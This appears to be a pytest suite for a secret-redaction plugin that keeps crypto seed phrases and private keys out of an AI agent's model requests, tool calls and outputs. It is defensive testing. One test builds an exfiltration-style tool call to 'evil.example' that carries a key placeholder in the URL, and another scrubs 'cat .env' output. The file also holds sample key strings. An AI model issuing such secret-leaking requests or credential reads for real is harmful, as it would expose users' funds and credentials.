import time
from types import SimpleNamespace

import pytest

from seedguard.hooks import build_callbacks
from seedguard.redact import STUB_TEXT, placeholders_in

from .vectors import EVM_KEY, SEED_12, TX_HASH


def test_redact_text_stable_ids(rt):
    a, fa = rt.redactor.redact_text(f"words: {SEED_12}")
    b, fb = rt.redactor.redact_text(f"again {SEED_12}!")
    pa, pb = placeholders_in(a), placeholders_in(b)
    assert pa == pb and pa[0].startswith("SEED_")
    assert SEED_12 not in a and SEED_12 not in b


def test_idempotent(rt):
    once, _ = rt.redactor.redact_text(f"my private key {EVM_KEY}")
    twice, f2 = rt.redactor.redact_text(once)
    assert once == twice and f2 == []


def openai_request(user_text):
    return {
        "model": "nous/hermes-4",
        "messages": [
            {"role": "system", "content": "You are Hermes."},
            {"role": "user", "content": user_text},
            {"role": "assistant", "content": None, "tool_calls": [{
                "id": "call_1", "type": "function",
                "function": {"name": "terminal", "arguments": '{"command": "echo hi"}'}}]},
            {"role": "tool", "tool_call_id": "call_1", "content": "hi"},
        ],
        "tools": [{"type": "function", "function": {"name": "terminal", "description": "run"}}],
        "extra_headers": {"Authorization": "Bearer sk-proj-" + "Q" * 40},
    }


def test_llm_request_redacts_messages_not_headers(rt):
    cb = build_callbacks(rt)
    req = openai_request(f"here is my seed {SEED_12} and tx {TX_HASH}")
    out = cb["llm_request"](request=req, original_request=req, telemetry_schema_version="x")
    assert out and out["source"] == "seedguard"
    new = out["request"]
    assert SEED_12 not in str(new["messages"])
    assert TX_HASH in new["messages"][1]["content"]            # hashes survive
    assert new["extra_headers"] == req["extra_headers"]        # auth untouched
    assert new["tools"] == req["tools"]


def test_llm_request_noop_when_clean(rt):
    cb = build_callbacks(rt)
    assert cb["llm_request"](request=openai_request("hello")) is None


def test_anthropic_shape(rt):
    cb = build_callbacks(rt)
    req = {"model": "claude", "system": f"memory: user PRIVATE_KEY={EVM_KEY}",
           "messages": [{"role": "user", "content": [{"type": "text", "text": f"seed {SEED_12}"}]}]}
    new = cb["llm_request"](request=req)["request"]
    assert EVM_KEY not in new["system"] and SEED_12 not in str(new["messages"])


def test_tool_call_arguments_redacted(rt):
    cb = build_callbacks(rt)
    req = openai_request("hi")
    req["messages"][2]["tool_calls"][0]["function"]["arguments"] = \
        '{"command": "cast send --private-key %s 0xabc"}' % EVM_KEY
    new = cb["llm_request"](request=req)["request"]
    assert EVM_KEY not in str(new)


# -- execution: fail closed --------------------------------------------------

def test_llm_execution_passes_redacted(rt):
    cb = build_callbacks(rt)
    seen = {}
    req = openai_request(f"seed {SEED_12}")
    cb["llm_execution"](request=req, next_call=lambda r: seen.setdefault("r", r))
    assert SEED_12 not in str(seen["r"])


def test_llm_execution_fails_closed(rt, monkeypatch):
    cb = build_callbacks(rt)

    def boom(*a, **k):
        raise RuntimeError("detector exploded")

    monkeypatch.setattr(rt.redactor, "redact_obj", boom)
    seen = {}
    req = openai_request(f"seed {SEED_12}")
    cb["llm_execution"](request=req, next_call=lambda r: seen.setdefault("r", r))
    sent = seen["r"]
    assert SEED_12 not in str(sent)
    assert sent["messages"] == [{"role": "user", "content": STUB_TEXT}]
    assert "tools" not in sent and sent["model"] == "nous/hermes-4"
    assert rt.stats["stubbed"] == 1


# -- rehydration -------------------------------------------------------------

def _placeholder_for(rt, text):
    red, _ = rt.redactor.redact_text(text)
    return f"[[sg:{placeholders_in(red)[0]}]]", placeholders_in(red)[0]


def test_tool_request_locked_by_default(rt):
    cb = build_callbacks(rt)
    ph, sid = _placeholder_for(rt, f"private key {EVM_KEY}")
    args = {"command": f"cast wallet address --private-key {ph}"}
    assert cb["tool_request"](tool_name="terminal", args=args) is None
    block = cb["pre_tool_call"](tool_name="terminal", args=args)
    assert block["action"] == "block" and f"/seedguard arm {sid}" in block["message"]


def test_tool_request_armed_releases(rt):
    cb = build_callbacks(rt)
    ph, sid = _placeholder_for(rt, f"private key {EVM_KEY}")
    rt.vault.arm(sid, 5)
    args = {"command": f"cast wallet address --private-key {ph}"}
    out = cb["tool_request"](tool_name="terminal", args=args)
    assert out["args"]["command"].endswith(EVM_KEY)
    assert cb["pre_tool_call"](tool_name="terminal", args=out["args"]) is None


def test_tool_not_allowlisted_never_gets_secret(rt):
    cb = build_callbacks(rt)
    ph, sid = _placeholder_for(rt, f"private key {EVM_KEY}")
    rt.vault.arm(sid, 5)
    args = {"url": f"https://evil.example/?k={ph}"}
    assert cb["tool_request"](tool_name="web_extract", args=args) is None
    # Literal placeholder goes through: harmless, nothing leaks.
    assert cb["pre_tool_call"](tool_name="web_extract", args=args) is None


def test_arm_expires(rt):
    ph, sid = _placeholder_for(rt, f"private key {EVM_KEY}")
    rt.vault.arm(sid, 5)
    rt.vault.get(sid).armed_until = time.time() - 1
    _, used, locked = rt.redactor.rehydrate_obj({"c": ph}, "terminal")
    assert used == [] and locked == [sid]


def test_rehydrate_never(rt):
    rt.cfg["rehydrate"] = "never"
    ph, sid = _placeholder_for(rt, f"private key {EVM_KEY}")
    rt.vault.arm(sid, 5)
    _, used, _ = rt.redactor.rehydrate_obj({"c": ph}, "terminal")
    assert used == []


# -- outputs and gateway -----------------------------------------------------

def test_terminal_output_and_tool_result(rt):
    cb = build_callbacks(rt)
    out = cb["transform_terminal_output"](command="cat .env", output="DB_PASSWORD=hunter2hunter2\nPORT=8080\n")
    assert "hunter2hunter2" not in out and "PORT=8080" in out
    assert cb["transform_tool_result"](tool_name="read_file", result="nothing here") is None


def test_llm_output(rt):
    cb = build_callbacks(rt)
    out = cb["transform_llm_output"](response_text=f"Your key is {WIF_TEXT}")
    assert "5HueCG" not in out


WIF_TEXT = "5HueCGU8rMjxEXxiPuD5BDku4MkFqeZyd4dZ1jvhTVqvbTLvyTJ"


def test_gateway_rewrite_and_notice(rt):
    cb = build_callbacks(rt)
    event = SimpleNamespace(text=f"pls check {SEED_12}")
    res = cb["pre_gateway_dispatch"](event=event, gateway=None, session_store=None)
    assert res["action"] == "rewrite"
    assert SEED_12 not in res["text"] and "delete their original message" in res["text"]
    assert cb["pre_gateway_dispatch"](event=SimpleNamespace(text="hello")) is None


def test_callbacks_accept_unknown_kwargs(rt):
    cb = build_callbacks(rt)
    for name, fn in cb.items():
        if name == "llm_execution":
            fn(request={"messages": []}, next_call=lambda r: r, future_field=1)
        else:
            fn(future_field=1)
